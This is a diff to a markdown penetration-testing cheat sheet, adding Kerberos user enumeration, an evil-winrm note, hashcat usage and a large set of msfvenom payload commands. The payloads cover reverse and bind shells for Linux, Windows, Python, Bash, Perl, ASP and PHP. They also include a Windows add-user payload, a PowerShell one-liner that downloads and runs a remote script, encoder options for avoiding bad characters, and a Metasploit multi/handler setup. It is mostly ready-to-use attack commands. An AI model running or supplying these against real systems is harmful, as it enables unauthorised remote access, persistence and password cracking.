@@ -136,6 +136,19 @@ file:
 
 [Go to Exploitation](#exploitation)
 
+#### Port 88
+
+In case you have a Kerberos instance, you can try to numerate the users with:
+
+```sh
+nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='test' <IP>
+```
+
+There is also the possibility to use Impacket's [GetNPUsers.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py) script to find all the users that do not require pre-authentification.
+
+There another tool, [kerbrute](https://github.com/ropnop/kerbrute) with which
+you can do basically the same stuff than above and a little more.
+
 #### Port 443 open
 
 * if the server only accepts localhost (you get that through the SSL certificate
@@ -228,8 +241,6 @@ mongo -u <USER> -p <PASSWORD> <HOST:PORT/DB>
 > db.task.insert(<EXPLOIT>)
 ```
 
-
-
 ## NSLookup
 
 Basic lookup:
@@ -251,6 +262,15 @@ Zone transfert:
 ```sh
 host -l <DOMAIN> <IP>
 ```
+
+#### Port 5985
+
+If this port is open, it's possible there is an instance of Windows Remove
+Management system. You can use
+[EvilRM](https://github.com/Hackplayers/evil-winrm) to connect to the target
+after you got credentials.
+
+[Go to Post-Exploitation](#post-exploitation)
 
 # Exploitation
 
@@ -304,12 +324,134 @@ sudo nc -nvlp 443 > incoming.exe     # Reciever
 nc -nv <LOCAL-IP> 443 < incoming.exe # Sender
 ```
 
-## Metasploit shells:
+## MSFVenom shells:
+
+### Linux
+
+Linux Meterpreter reverse shell x86 multi stage:
+
+```sh
+msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf
+```
+
+Linux Meterpreter bind shell x86 multi stage:
+
+```sh
+msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=<IP> LPORT=<PORT> -f elf > shell.elf
+```
+
+Linux bind shell x64 single stage:
+
+```sh
+msfvenom -p linux/x64/shell_bind_tcp RHOST=<IP> LPORT=<PORT> -f elf > shell.elf
+```
+
+Linux reverse shell x64 single stage:
+
+```sh
+msfvenom -p linux/x64/shell_reverse_tcp RHOST=<IP> LPORT=<PORT> -f elf > shell.elf
+```
+
+### Windows
+
+Windows Meterpreter http reverse shell:
+
+```sh
+msfvenom -p windows/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" -f exe > shell.exe
+```
+
+Windows Meterpreter bind shell:
+
+```sh
+msfvenom -p windows/meterpreter/bind_tcp RHOST=<IP> LPORT=<PORT> -f exe > shell.exe
+```
+
+Windows CMD Multi Stage:
+
+```sh
+msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe
+```
+
+Windows CMD Single Stage:
+
+```sh
+msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe
+```
+
+Windows add user:
+
+```sh
+msfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe
+```
 
 Windows shell which doesn't break the application for a x86 architecture:
 
 ```sh
-msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=4444 EXITFUNC=thread -f exe -a x86 --platform windows -o sploit.exe
+msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> EXITFUNC=thread -f exe -a x86 --platform windows -o sploit.exe
+```
+
+
+Windows Exec Nishang Powershell in python
+
+```sh
+msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.webClient).downloadString('http://IP/nishang.ps1')\"" -f python
+```
+
+Bad characters shikata_ga_nai:
+
+```sh
+msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=<IP> LPORT=<PORT> -f c -e x86/shikata_ga_nai -b "\x04\xA0"
+```
+
+Bad characters fnstenv_mov:
+
+```sh
+msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=<IP> LPORT=<PORT> -f c -e x86/fnstenv_mov -b "\x04\xA0"
+```
+
+### Misc
+
+Python Shell:
+
+```sh
+msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<PORT> -f raw > shell.py
+```
+
+Bash Shell:
+
+```sh
+msfvenom -p cmd/unix/reverse_bash LHOST=<IP> LPORT=<PORT> -f raw > shell.sh
+```
+
+Perl Shell:
+
+```sh
+msfvenom -p cmd/unix/reverse_perl LHOST=<IP> LPORT=<PORT> -f raw > shell.pl
+```
+
+ASP Meterpreter Shell:
+
+```sh
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
+```
+
+PHP Reverse Shell:
+
+```sh
+msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > phpreverseshell.php
+```
+
+To get multiple session on a single multi/handler, you need to set the
+ExitOnSession option to false and run the exploit -j instead of just the
+exploit. For example, for meterpreter/reverse_tcp payload:
+
+```
+msf>use exploit/multi/handler
+msf>set payload windows/meterpreter/reverse_tcp
+msf>set lhost <IP>
+msf>set lport <PORT>
+msf> set ExitOnSession false
+msf>exploit -j
 ```
 
 ## Webshells
@@ -358,7 +500,7 @@ curl -u <USER> <IP> --data-binary <PAYLOAD>
         Send specified data in POST request. Details provided below.
 
 `-f, --fail`
-        Fail silently (don't output HTML error form if returned). 
+        Fail silently (don't output HTML error form if returned).
 
 `-F, --form <name=content>`
         Submit form data.
@@ -395,7 +537,7 @@ curl -u <USER> <IP> --data-binary <PAYLOAD>
         Make curl display information on stdout after a completed transfer. See man page for more details on
         available variables. Convenient way to force curl to append a newline to output: `-w "\n"` (can add
         to `~/.curlrc`).
-        
+
 `-X, --request`
         The request method to use.
 
@@ -423,11 +565,11 @@ For sending data with POST and PUT requests, these are common `curl` options:
  * content type header
   * `-H "Content-Type: application/x-www-form-urlencoded"`
   * `-H "Content-Type: application/json"`
- 
+
 * data
   * form urlencoded: `-d "param1=value1&param2=value2"` or `-d @data.txt`
   * json: `-d '{"key1":"value1", "key2":"value2"}'` or `-d @data.json`
-  
+
 ### Examples
 
 #### POST application/x-www-form-urlencoded
@@ -441,15 +583,15 @@ explicit:
     curl -d "param1=value1&param2=value2" -H "Content-Type: application/x-www-form-urlencoded" -X POST http://localhost:3000/data
 
 with a data file
- 
+
     curl -d "@data.txt" -X POST http://localhost:3000/data
 
 #### POST application/json
 
     curl -d '{"key1":"value1", "key2":"value2"}' -H "Content-Type: application/json" -X POST http://localhost:3000/data
-    
+
 with a data file
- 
+
     curl -d "@data.json" -X POST http://localhost:3000/data
 
 
@@ -565,7 +707,16 @@ Decompress with tar:
 tar -C <DEST> -xvf <FILE>
 ```
 
-### John
+### Hashcat
+
+Basic use:
+
+```sh
+hashcat -m 0 -a 0 -o <OUTPUT_FILE> <INPUT_FILE> <WORDLIST>
+```
+
+* `-m`: defines the algorithm type ([full list](https://hashcat.net/wiki/doku.php?id=example_hashes))
+* `-a`: attack mode (0: straight, 1: combination, 3: brute-force)
 
 ### Hydra
 
@@ -601,12 +752,13 @@ alias grepip='grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b"'
 
 ## Website
 
-* [PenstestMonkey](http://pentestmonkey.net/)
-* [Hacktrics.xyz](https://book.hacktricks.xyz/)
-* [blog.g0tmi1k.com](https://blog.g0tmi1k.com/)
-* [absolom.com](https://www.absolomb.com/)
 * [GTFObins](https://gtfobins.github.io/)
+* [Hacktrics.xyz](https://book.hacktricks.xyz/)
 * [LOLBas](https://lolbas-project.github.io/#)
+* [PenstestMonkey](http://pentestmonkey.net/)
+* [Red Teaming Experiments](https://ired.team/)
+* [absolom.com](https://www.absolomb.com/)
+* [blog.g0tmi1k.com](https://blog.g0tmi1k.com/)
 
 ## Videos
 
